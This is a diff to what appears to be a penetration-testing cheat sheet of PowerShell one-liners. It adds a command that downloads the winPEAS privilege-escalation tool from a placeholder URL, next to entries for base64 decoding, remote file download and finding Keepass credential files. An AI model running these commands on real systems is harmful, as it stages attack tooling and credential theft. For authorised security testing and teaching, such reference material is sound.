@@ -100,9 +100,14 @@ Powershell Convert from Base64:
 [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('<insert payload here>'))
 ```
 
-Powershell Download From URL:
+Powershell download from URL:
 ```powershell
 (New-Object System.Net.WebClient).DownloadFile("<URL>","C:\path\to\destination")
+```
+
+Alternative Powershell download from URL:
+```powershell
+iwr -uri http://my.url/winPEASx64.exe -Outfile winPEAS.exe
 ```
 
 Powershell find Keepass file:
